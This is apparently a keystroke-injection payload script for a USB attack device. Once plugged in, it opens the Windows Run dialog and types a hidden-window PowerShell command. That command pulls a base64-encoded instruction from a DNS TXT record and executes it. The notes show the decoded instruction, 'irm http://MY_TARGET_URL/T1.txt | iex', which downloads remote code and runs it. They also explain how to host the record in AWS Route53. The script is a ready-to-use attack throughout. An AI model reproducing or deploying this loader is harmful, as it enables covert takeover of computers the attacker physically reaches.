REM_BLOCK
Title: DNS-TXT-CommandInjection
CONFIGURATION
REQUIRED - Provide URL used for Example #MY_TARGET_URL
NOTES: No base64 can be used as an alternative by replacing "$a=",";powershell -e $a" with just "|iex"
for the STRING payload below. Examples of the decoded command and encoded command are shown below to put into DNS TXT record.
Decoded: "irm http://MY_TARGET_URL/T1.txt | iex"
Encoded: "aQByAG0AIABoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAFQAMQAuAHQAeAB0ACAAfAAgAGkAZQB4AA=="
Create TXT record in AWS Route53
https://www.entrust.com/knowledgebase/ssl/how-to-create-a-txt-record-on-amazon-aws-route-53-for-entrust-email-validation-method
END_REM

DEFINE #MY_TARGET_URL example.com
DELAY 2500
GUI r
DELAY 500
STRINGLN powershell /w 1 $a=(resolve-dnsname #MY_TARGET_URL TXT).strings;powershell -e $a
